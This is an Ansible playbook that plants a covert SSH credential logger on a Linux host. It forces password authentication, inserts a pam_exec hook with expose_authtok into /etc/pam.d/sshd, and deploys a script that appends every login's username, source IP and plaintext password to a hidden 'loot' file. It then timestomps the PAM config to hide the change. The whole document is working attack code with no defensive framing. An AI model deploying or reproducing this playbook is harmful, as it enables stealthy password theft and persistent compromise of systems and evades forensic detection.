---
# 1. Setup the "Dead Drop" directory
- name: Create hidden loot directory
  become: yes
  file:
    path: "/var/tmp/.system-cache"
    state: directory
    mode: '0777'
    owner: root
    group: root

# 2. Configure SSH and PAM in one loop
- name: Force SSH and PAM configuration
  become: yes
  lineinfile:
    path: "{{ item.path }}"
    regexp: "{{ item.regexp }}"
    line: "{{ item.line }}"
    insertbefore: "{{ item.insertbefore | default(omit) }}"
  loop:
    - { path: '/etc/ssh/sshd_config', regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication yes' }
    - { path: '/etc/ssh/sshd_config', regexp: '^#?UsePAM', line: 'UsePAM yes' }
    - { path: '/etc/pam.d/sshd', regexp: '^auth optional pam_exec.so', line: 'auth optional pam_exec.so quiet expose_authtok /usr/local/bin/ssh-auth-check', insertbefore: 'BOF' }
  register: ssh_trap_config

# 3. Deploy the actual logger script
- name: Deploy PAM credential logger
  become: yes
  copy:
    dest: /usr/local/bin/ssh-auth-check
    mode: '0755'
    content: |
      #!/bin/bash
      # Read the password from stdin (provided by expose_authtok)
      read -d '' -r PASSWORD
      if [ -n "$PASSWORD" ]; then
          # Log the timestamp, username, source IP, and the password
          echo "$(date) | User: $PAM_USER | From: $PAM_RHOST | Pass: $PASSWORD" >> /var/tmp/.system-cache/.ssh_loot.txt
      fi

# 4. Restart SSH only if we changed the config
- name: Restart SSH service
  become: yes
  systemd:
    name: ssh
    state: restarted
  when: ssh_trap_config.changed

# 5. Anti-Forensics: Make the SSH PAM file look untouched
- name: Timestomp PAM config
  become: yes
  shell: "touch -r /etc/pam.d/common-password /etc/pam.d/sshd"
  ignore_errors: yes